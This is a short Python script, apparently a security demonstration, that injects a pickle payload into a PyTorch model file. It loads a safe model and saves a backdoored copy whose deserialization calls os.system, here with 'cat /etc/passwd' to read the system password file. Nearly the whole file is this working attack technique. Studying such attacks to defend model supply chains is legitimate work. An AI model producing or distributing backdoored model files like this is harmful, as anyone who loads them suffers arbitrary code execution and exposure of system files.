import torch
import os
from pickle_codeinjection import PickleInject, get_payload

# Define constants
# Model name (not used in this script but defined for reference)
model_name = "cardiffnlp/twitter-roberta-base-sentiment"
# Directory where PyTorch model files are stored
model_directory = "PyTorchModels"

# Security demonstration: Define malicious payload to inject into the model
# Command type: "system" will execute os.system() when the model is loaded
command = "system"
# Malicious code that will be executed when the backdoored model is loaded
# This example attempts to read the system password file
malicious_code = """cat /etc/passwd
                """

# Define file paths for the safe (original) and unsafe (backdoored) models
safe_model_path = os.path.join(model_directory, "safe_model.pt")
unsafe_model_path = os.path.join(model_directory, "unsafe_model.pt")

# Generate a pickle payload object that will execute the malicious code
# When the model is loaded, this payload will be deserialized and executed
payload = get_payload(command, malicious_code)

# Backdoor the model: Load the safe model and save it with injected malicious code
# This uses a custom pickle module that injects the payload during serialization
# WARNING: When torch.load() is called on unsafe_model_path, the malicious code will execute
torch.save(
    torch.load(safe_model_path),  # Load the original safe model
    f=unsafe_model_path,           # Save to unsafe model path
    pickle_module=PickleInject([payload]),  # Use custom pickle module to inject payload
)
